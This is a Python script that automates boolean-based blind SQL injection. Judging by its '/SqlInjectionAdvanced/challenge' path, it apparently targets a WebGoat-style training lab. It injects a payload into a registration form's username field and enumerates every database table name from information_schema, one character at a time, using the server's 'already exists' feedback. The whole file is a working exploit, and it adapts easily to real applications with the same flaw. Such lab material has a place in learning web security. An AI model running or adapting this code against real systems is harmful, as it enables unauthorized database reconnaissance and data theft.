import json
import requests
from config.settings import SESSION_COOKIE, SERVER_URL

def find_all_tables():
    """
    Finds all table names in the database using blind SQL injection.

    Returns:
        list: A list of table names.
    """
    if not SESSION_COOKIE or not SERVER_URL:
        raise ValueError("Server URL or session cookie is not configured in environment settings.")

    alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_'
    headers = {
        'Cookie': SESSION_COOKIE,
    }

    def check_table_exists(starting_char, table_index, table_number):
        payload = f"' OR (SELECT substring(table_name, {table_index}, 1) FROM information_schema.tables LIMIT 1 OFFSET {table_number}) = '{starting_char}' --"
        data = {
            'username_reg': payload,
            'email_reg': 'a@a',
            'password_reg': 'a',
            'confirm_password_reg': 'a'
        }

        try:
            r = requests.put(f'{SERVER_URL}/SqlInjectionAdvanced/challenge', headers=headers, data=data)
            response = json.loads(r.text)
            return "already exists" in response.get('feedback', '')
        except requests.RequestException as e:
            print(f"Request error: {e}")
            return False
        except json.JSONDecodeError:
            print("Failed to decode JSON response from server.")
            return False

    table_names = []
    table_number = 0
    while True:
        table_name = ''
        table_index = 1

        while True:
            char_found = False
            for char in alphabet:
                if check_table_exists(char, table_index, table_number):
                    table_name += char
                    table_index += 1
                    char_found = True
                    break

            if not char_found:
                if table_name:
                    print(table_number + 1, ". Table Found: ", table_name)
                    table_names.append(table_name)
                break

        if not table_name:
            break

        table_number += 1

    return table_names
